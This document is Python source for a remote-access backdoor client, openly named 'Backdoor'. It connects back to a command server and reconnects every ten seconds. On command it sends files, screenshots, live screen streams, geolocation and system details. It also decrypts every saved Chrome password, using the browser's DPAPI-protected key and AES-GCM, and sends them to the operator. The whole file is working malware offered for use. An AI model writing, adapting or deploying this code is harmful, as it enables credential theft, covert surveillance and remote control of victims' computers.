import socket
import json
import subprocess
import os
import pyautogui
import threading
import shutil
import sys
import time
from vidstream import ScreenShareClient
from requests import get
import geocoder
from Crypto.Cipher import AES
import base64
import win32crypt
from datetime import timezone, datetime, timedelta
import sqlite3
import GPUtil
import psutil
import platform
from tabulate import tabulate

# TODO: Make a dynamic way of getting this info
server_info = {
      'host': '127.0.0.1',
      'port': 5555
}


# HELPER FUNCTIONS BEGIN

# send() function wrapper with json
def send(sockfd, data):
    jsonData = json.dumps(data)
    sockfd.send(jsonData.encode())

# recv() function wrapper
def recv(sockfd):
    data = ''

    while True:
        try:
            data = data + sockfd.recv(1024).decode('latin-1').rstrip()
            return json.loads(data)
        
        except ValueError:
            continue

# Get the current location info of the target and return it as JSON
def getMyLocation():
      g = geocoder.ip('me')
      return g.json


# Upload file to the server's file system
def uploadFile(sockfd, fileName):
    f = open(fileName, 'rb')
    sockfd.send(f.read())

# Download file from server fs
def downloadFileRecv(sockfd, fileName):
    f = open(fileName, 'wb')
    sockfd.settimeout(1) 
    chunk = sockfd.recv(1024)

    while chunk:
        f.write(chunk)

        try:
            chunk = sockfd.recv(1024)

        except socket.timeout as e:
            break

    sockfd.settimeout(None)
    f.close()


def screenshot():
      prtscr = pyautogui.screenshot()
      prtscr.save('screen.png')



def chrome_date_and_time(chrome_data):
    # Return a `datetime.datetime` object from a chrome format datetime
    # Since `chromedate` is formatted as the number of microseconds since January, 1601
    return datetime(1601, 1, 1) + timedelta(microseconds=chrome_data)
  
  
def fetching_encryption_key():
    # Local_computer_directory_path will look 
    # like this below
    # C: => Users => <Your_Name> => AppData => Local => Google => Chrome => User Data => Local State
    local_computer_directory_path = os.path.join(
      os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", 
      "User Data", "Local State")
      
    with open(local_computer_directory_path, "r", encoding="utf-8") as f:
        local_state_data = f.read()
        local_state_data = json.loads(local_state_data)
  
    # decoding the encryption key using base64
    encryption_key = base64.b64decode(
      local_state_data["os_crypt"]["encrypted_key"])
      
    # remove Windows Data Protection API (DPAPI) str
    encryption_key = encryption_key[5:]
      
    # return decrypted key that was originally encrypted
    # using a session key derived from current user's logon credentials
    # doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html
    return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]
  
  
def password_decryption(password, encryption_key):
    try:
        iv = password[3:15]
        password = password[15:]
          
        # generate cipher
        cipher = AES.new(encryption_key, AES.MODE_GCM, iv)
          
        # decrypt password
        return cipher.decrypt(password)[:-16].decode()
    except:
          
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            # Not supported
            return ''

def get_chrome_passwords():
      # Get the AES key
    key = fetching_encryption_key()

    # local sqlite Chrome database path
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                           "Google", "Chrome", "User Data", "default", "Login Data")
    
    # copy the file to another location
    # as the database will be locked if chrome is currently running
    filename = "ChromePasswords.db"
    shutil.copyfile(db_path, filename)
      
    # connecting to the database
    db = sqlite3.connect(filename)
    cursor = db.cursor()
      
    # 'logins' table has the data
    cursor.execute(
        "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
        "order by date_last_used")
    
    out = """""" # output string

    # iterate over all rows
    for row in cursor.fetchall():

        main_url = row[0]
        login_page_url = row[1]
        user_name = row[2]
        decrypted_password = password_decryption(row[3], key)
        date_of_creation = row[4]
        last_usuage = row[5]
          
        if user_name or decrypted_password:
            # Append data to output string
            out += "\nURL: " + main_url + "\n"
            out += "Login Page URL: " + login_page_url + "\n"
            out += "User Name: " + user_name + "\n"
            out += "Password: " + decrypted_password + "\n"
          
        else:
            continue
          
        if date_of_creation != 86400000000 and date_of_creation:
            out += "Date of Creation: " + str(chrome_date_and_time(date_of_creation)) + "\n"
          
        if last_usuage != 86400000000 and last_usuage:
            out += "Last Usage: " + str(chrome_date_and_time(last_usuage)) + "\n"
        
    cursor.close()
    db.close()
      
    try:
          
        # trying to remove the copied db file as 
        # well from local computer
        os.remove(filename)
    except:
        pass

    return out

# This function converts a large number of bytes into a scaled format (kb, mb, gb, etc..)
def get_size(bytes, suffix="B"):
      factor = 1024
      for unit in ["", "K", "M", "G", "T", "P", "E", "Z"]: # Last 3 are a bit overkill but yeah
            if bytes < factor:
                  return f"{bytes:.2f}{unit}{suffix}"
            bytes /= factor


def system_information():
      out = "" # Output string

      out += "="*30 + "System Information" + "="*30 + "\n"
      uname = platform.uname()
      
      out += "System: " + uname.system + "\n"
      out += "Node Name: " + uname.node + "\n"
      out += "Release: " + uname.release + "\n"
      out += "Version: " + uname.version + "\n"
      out += "Machine: " + uname.machine + "\n"
      out += "Processor: " + uname.processor + "\n"

      # Boot Time
      out += "="*30 + "Boot Time" + "="*30 + "\n"
      boot_time_timestamp = psutil.boot_time()
      bt = datetime.fromtimestamp(boot_time_timestamp)
      out += f"Boot Time: {bt.year}/{bt.month}/{bt.day} {bt.hour}:{bt.minute}:{bt.second}" + "\n"

      # CPU info
      out += "="*30 + "CPU Info" + "="*30 + "\n"
      # number of cores
      out += "Physical cores: " + str(psutil.cpu_count(logical=False)) + "\n"
      out += "Logical cores: " + str(psutil.cpu_count(logical=True)) + "\n"
      # CPU frequencies
      cpufreq = psutil.cpu_freq()
      out += f"Max Frequency: {cpufreq.max:.2f}Mhz" + "\n"
      out += f"Min Frequency: {cpufreq.min:.2f}Mhz" + "\n"
      out += f"Current Frequency: {cpufreq.current:.2f}Mhz" + "\n"
      # CPU usage
      out += "CPU Usage Per Core:" + "\n"
      for i, percentage in enumerate(psutil.cpu_percent(percpu=True, interval=1)):
            out += f"Core {i}: {percentage}%" + "\n"
            out += f"Total CPU Usage: {psutil.cpu_percent()}%" + "\n"

      # Memory Information
      out += "="*30 + "Memory Information" + "="*30 + "\n"
      # get the memory details
      svmem = psutil.virtual_memory()
      out += f"Total: {get_size(svmem.total)}" + "\n"
      out += f"Available: {get_size(svmem.available)}" + "\n"
      out += f"Used: {get_size(svmem.used)}" + "\n"
      out += f"Percentage: {svmem.percent}%" + "\n"
      out += "="*15 + "SWAP" + "="*15
      # get the swap memory details (if exists)
      swap = psutil.swap_memory()
      out += f"Total: {get_size(swap.total)}" + "\n"
      out += f"Used: {get_size(swap.used)}" + "\n"
      out += f"Free: {get_size(swap.free)}" + "\n"
      out += f"Percentage: {swap.percent}%" + "\n"

      # Disk Information
      out += "="*30 + "Disk Information" + "="*30 + "\n"
      out += "Partitions and Usage:" + "\n"
      # get all disk partitions
      partitions = psutil.disk_partitions()
      for partition in partitions:
            out += f"=== Device: {partition.device} ===" + "\n"
            out += f"  Mountpoint: {partition.mountpoint}" + "\n"
            out += f"  File system type: {partition.fstype}" + "\n"

            try:
                  partition_usage = psutil.disk_usage(partition.mountpoint)
            except PermissionError:
                  # this can be catched due to the disk that
                  # isn't ready
                  continue

            out += f"  Total Size: {get_size(partition_usage.total)}" + "\n"
            out += f"  Used: {get_size(partition_usage.used)}" + "\n"
            out += f"  Free: {get_size(partition_usage.free)}" + "\n"
            out += f"  Percentage: {partition_usage.percent}%" + "\n"

            # get IO statistics since boot
            disk_io = psutil.disk_io_counters()
            out +=f"Total read: {get_size(disk_io.read_bytes)}" + "\n"
            out +=f"Total write: {get_size(disk_io.write_bytes)}" + "\n"
      
      # Network information
      out += "="*30 + "Network Information" + "="*30 + "\n"
      # get all network interfaces (virtual and physical)
      if_addrs = psutil.net_if_addrs()
      for interface_name, interface_addresses in if_addrs.items():
            out += f"=== Interface: {interface_name} ===" + "\n"
            for address in interface_addresses:
                  if str(address.family) == 'AddressFamily.AF_INET':
                        out += f"  IP Address: {address.address}" + "\n"
                        out += f"  Netmask: {address.netmask}" + "\n"
                        out += f"  Broadcast IP: {address.broadcast}" + "\n"
                  elif str(address.family) == 'AddressFamily.AF_PACKET':
                        out += f"  MAC Address: {address.address}" + "\n"
                        out += f"  Netmask: {address.netmask}" + "\n"
                        out += f"  Broadcast MAC: {address.broadcast}" + "\n"

      # get IO statistics since boot
      net_io = psutil.net_io_counters()
      out +=f"Total Bytes Sent: {get_size(net_io.bytes_sent)}" + "\n"
      out +=f"Total Bytes Received: {get_size(net_io.bytes_recv)}" + "\n"

      # GPU information
      out += "="*30 + "GPU Details" + "="*30 + "\n"
      gpus = GPUtil.getGPUs()
      list_gpus = []
      for gpu in gpus:
            # get the GPU id
            gpu_id = gpu.id
            # name of GPU
            gpu_name = gpu.name
            # get % percentage of GPU usage of that GPU
            gpu_load = f"{gpu.load*100}%"
            # get free memory in MB format
            gpu_free_memory = f"{gpu.memoryFree}MB"
            # get used memory
            gpu_used_memory = f"{gpu.memoryUsed}MB"
            # get total memory
            gpu_total_memory = f"{gpu.memoryTotal}MB"
            # get GPU temperature in Celsius
            gpu_temperature = f"{gpu.temperature} °C"
            gpu_uuid = gpu.uuid
            list_gpus.append((
                  gpu_id, gpu_name, gpu_load, gpu_free_memory, gpu_used_memory,
                  gpu_total_memory, gpu_temperature, gpu_uuid
            ))

      out += tabulate(list_gpus, headers=("id", "name", "load", "free memory", "used memory", "total memory",
                                    "temperature", "uuid"))

      out += "\n"
      return out

# HELPER FUNCTIONS END


class Backdoor:
      def __init__(self, server_ip, server_port):
            self.server_ip = server_ip
            self.server_port = server_port
            self.should_run = True

      def screenshare(self, port):
            sender = ScreenShareClient(self.server_ip, port)
            sender_thread = threading.Thread(target=sender.start_stream)
            sender_thread.setDaemon(True)
            sender_thread.start()
            sender_thread.join()

      # Backdoor-Server interface
      def server_coms(self):
            while True:
                  command = recv(self.sockfd)

                  # Disconnects the backdoor from the server
                  if command == 'detatch':
                        self.sockfd.close()
                        self.should_run = False
                        break

                  # Receive a file from the server
                  elif command.startswith('upload'):
                        downloadFileRecv(self.sockfd, command[len('upload') + 1:])
                  
                  # Send a file to the server
                  elif command.startswith('download'):
                        uploadFile(self.sockfd, command[len('download') + 1:])

                  # Take a screenshot and send it to the server
                  elif command == 'screenshot':
                        screenshot()
                        uploadFile(self.sockfd, 'screen.png') # Send screenshot file
                        os.remove('screen.png') # Remove screenshot from target's file system
                  
                  # Send location info
                  elif command == 'location':
                        location = geocoder.ip('me') # The location data will be sent as a JSON object. It must be parsed by the server
                        send(self.sockfd, location.json)
                  
                  elif command == 'chrome-passwords':
                        password_data = get_chrome_passwords()
                        send(self.sockfd, password_data)
                  
                  elif command == 'system-info':
                        send(self.sockfd, system_information())
                  
                  elif command == 'screenshare':
                        port = recv(self.sockfd) # Receive the streaming server port info
                        self.screenshare(port)

                  elif command == 'attempt-reconnect': # If the backdoor receives this command it means the server went offline.
                        print("Server went offline")
                        break                          # The backdoor should go back to the start() loop and attempt a reconnect every 10 seconds

      def start(self):
            # Attempt to connect to the server every 10 seconds until a connection is established
            while True:
                  try:
                        self.sockfd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        self.sockfd.connect((self.server_ip, self.server_port))
                        self.server_coms()
                        self.sockfd.close()
                        break
                  
                  except:
                        time.sleep(10)
                        continue

      def run(self):
            while self.should_run:
                  self.start()
                  print("Attempting to reconnect")


if __name__ == '__main__':
      backdoor = Backdoor(server_info['host'], server_info['port'])
      backdoor.run()